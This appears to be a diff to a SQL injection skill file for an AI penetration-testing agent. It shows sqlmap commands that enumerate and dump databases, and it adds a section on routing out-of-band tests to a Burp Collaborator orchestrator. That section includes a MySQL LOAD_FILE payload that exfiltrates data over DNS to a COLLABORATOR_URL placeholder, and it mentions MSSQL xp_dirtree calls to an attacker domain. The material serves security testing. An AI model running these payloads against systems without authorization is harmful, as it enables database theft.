@@ -407,3 +407,21 @@ sqlmap -r request.txt --batch --technique=BT -p "id" --dbs
 # Dump data
 sqlmap -r request.txt --batch --technique=BT -D TARGET_DB -T TARGET_TABLE --dump
 ```
+
+## Collaborator Exit (Burp co-pilot path)
+
+If `engagement/state.md` contains `burp-copilot: active` AND you reach an OOB
+SQL injection testing point that requires DNS/HTTP callbacks, return to the
+orchestrator with:
+
+**Routing Recommendations:**
+- OOB needed: OOB SQL injection at [endpoint]/[parameter]
+- Payload template: [SQL payload with COLLABORATOR_URL placeholder — e.g., `LOAD_FILE(CONCAT('\\\\',version(),'.COLLABORATOR_URL\\a'))` for MySQL]
+- Interaction type: dns
+- Context: [what a callback confirms — e.g., "DNS exfiltration via MySQL LOAD_FILE", "MSSQL xp_dirtree to attacker domain"]
+
+The orchestrator handles Collaborator payload generation and interaction
+polling in the main context, then re-invokes this skill with results.
+
+If `burp-copilot` is NOT active, use existing fallbacks (boolean-based,
+time-based extraction, interactsh for OOB).
